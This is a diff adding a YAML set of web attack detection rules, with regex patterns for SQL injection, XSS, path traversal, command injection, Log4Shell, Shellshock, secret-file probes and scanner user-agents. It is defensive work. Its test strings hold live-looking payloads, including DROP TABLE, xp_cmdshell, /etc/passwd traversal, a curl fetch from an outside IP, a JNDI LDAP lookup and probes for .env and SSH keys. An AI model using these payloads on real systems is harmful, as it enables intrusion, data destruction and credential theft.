@@ -1,0 +1,152 @@
+# Web attack rules: matched against the URL-decoded request path (a '+'-as-space
+# variant is also tried), and optionally the User-Agent / Referer.
+
+- id: web-sqli-union
+  name: SQL_INJECTION
+  title: "SQLi: UNION-based"
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  pattern: '\bunion\b(?:\s|/\*.*?\*/)+(?:all\s+)?select\b'
+  tests:
+    match: ["/p.php?id=1 UNION ALL SELECT NULL,password FROM users", "/p.php?id=1 union/**/select 1,2"]
+    no_match: ["/blog/union-station-review", "/products.php?id=12"]
+
+- id: web-sqli-tautology
+  name: SQL_INJECTION
+  title: "SQLi: boolean tautology"
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  pattern: '\b(?:or|and)\b\s+[''"]?(\w+)[''"]?\s*=\s*[''"]?\1\b'
+  tests:
+    match: ["/p.php?id=1' OR '1'='1", "/p.php?id=1+AND+1=1", "/login?u=admin' or 'a'='a"]
+    no_match: ["/search?q=black+and+white+shoes", "/order?color=red&size=small"]
+
+- id: web-sqli-stacked
+  name: SQL_INJECTION
+  title: "SQLi: stacked query"
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  pattern: ';\s*(?:(?:drop|truncate|alter)\s+table|delete\s+from|insert\s+into|exec(?:ute)?\s)'
+  tests:
+    match: ["/p.php?id=1; DROP TABLE users", "/p.php?id=1;exec xp_cmdshell 'whoami'"]
+    no_match: ["/a;b", "/docs/drop-table-guide"]
+
+- id: web-sqli-time-based
+  name: SQL_INJECTION
+  title: "SQLi: time-based blind"
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  pattern: '\b(?:sleep|pg_sleep|benchmark)\s*\(\s*\d|\bwaitfor\s+delay\b'
+  tests:
+    match: ["/p.php?id=1 AND SLEEP(5)", "/x?id=1;WAITFOR DELAY '0:0:5'"]
+    no_match: ["/sleep-tips", "/benchmarks/2026"]
+
+- id: web-sqli-schema-enum
+  name: SQL_INJECTION
+  title: "SQLi: schema enumeration"
+  type: web
+  severity: medium
+  mitre: [T1190]
+  block: inbound
+  pattern: '\binformation_schema\b|\bsysobjects\b'
+  tests:
+    match: ["/p.php?id=-1 union select table_name from information_schema.tables"]
+    no_match: ["/docs/schema", "/information-security"]
+
+- id: web-xss
+  name: XSS
+  title: "XSS: script injection"
+  type: web
+  severity: medium
+  mitre: [T1190]
+  block: inbound
+  pattern: '<\s*script\b|javascript\s*:|\bon(?:error|load|mouseover)\s*='
+  tests:
+    match: ["/search?q=<script>alert(1)</script>", "/r?u=javascript:alert(1)", "/i?x=<img src=x onerror=alert(1)>"]
+    no_match: ["/scripts/app.js", "/blog/onload-performance"]
+
+- id: web-path-traversal
+  name: PATH_TRAVERSAL
+  title: Path traversal / LFI
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  pattern: '(?:\.\.[/\\]){2,}|/etc/(?:passwd|shadow)\b|\bwin\.ini\b'
+  tests:
+    match: ["/dl.php?file=../../../etc/passwd", "/x?f=..\\..\\windows\\win.ini"]
+    no_match: ["/docs/../index.html", "/etc-passwords-guide"]
+
+- id: web-command-injection
+  name: COMMAND_INJECTION
+  title: OS command injection
+  type: web
+  severity: high
+  mitre: [T1190, T1059.004]
+  block: inbound
+  pattern: '(?:;|\||`|\$\()\s*(?:cat\s+/etc/|id\s*(?:$|[;|`)])|whoami\b|uname\s+-a|(?:wget|curl)\s+https?://)'
+  tests:
+    match: ["/ping?host=127.0.0.1;cat /etc/passwd", "/ping?host=x|whoami", "/x?h=$(whoami)", "/run?c=1;curl http://203.0.113.9/x"]
+    no_match: ["/a?x=1&id=5", "/blog/curl-tutorial", "/search?q=whoami+meaning"]
+
+- id: web-log4shell
+  name: LOG4SHELL
+  title: Log4Shell JNDI injection (CVE-2021-44228)
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  fields: [path, user_agent, referrer]
+  pattern: '\$\{\s*(?:jndi\s*:|\$\{\s*(?:lower|upper|::-|env))'
+  references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
+  tests:
+    match: ["/?x=${jndi:ldap://203.0.113.5/a}", {user_agent: "${${lower:j}ndi:ldap://x/a}"}]
+    no_match: ["/price?x=${amount}", {user_agent: "Mozilla/5.0"}]
+
+- id: web-shellshock
+  name: SHELLSHOCK
+  title: Shellshock (CVE-2014-6271)
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  fields: [user_agent, referrer, path]
+  pattern: '\(\s*\)\s*\{\s*:\s*;\s*\}\s*;'
+  references: ["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"]
+  tests:
+    match: [{user_agent: "() { :; }; /bin/bash -c 'id'"}]
+    no_match: [{user_agent: "Mozilla/5.0 (X11; Linux x86_64)"}]
+
+- id: web-sensitive-file-probe
+  name: SENSITIVE_FILE_PROBE
+  title: Probe for secrets / config files
+  type: web
+  severity: medium
+  mitre: [T1595.003]
+  block: inbound
+  pattern: '/\.(?:git/(?:config|HEAD)|env\b|aws/credentials|ssh/id_(?:rsa|ed25519))|/wp-config\.php\.(?:bak|old|save|swp)|/\.DS_Store'
+  false_positives: ["Your own monitoring checking that .env is NOT reachable"]
+  tests:
+    match: ["/.env", "/.git/config", "/wp-config.php.bak", "/backup/.aws/credentials"]
+    no_match: ["/environment", "/docs/git-config-guide", "/.well-known/security.txt"]
+
+- id: web-scanner-user-agent
+  name: SCANNER_USER_AGENT
+  title: "Offensive tool user-agent: {match}"
+  type: web
+  severity: medium
+  mitre: [T1595.002]
+  block: inbound
+  fields: [user_agent]
+  pattern: 'sqlmap|nikto|nmap|masscan|gobuster|dirbuster|wpscan|zgrab|nuclei|hydra|acunetix|feroxbuster|ffuf'
+  tests:
+    match: [{user_agent: "sqlmap/1.8.11#stable (https://sqlmap.org)"}, {user_agent: "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)"}]
+    no_match: [{user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0"}]
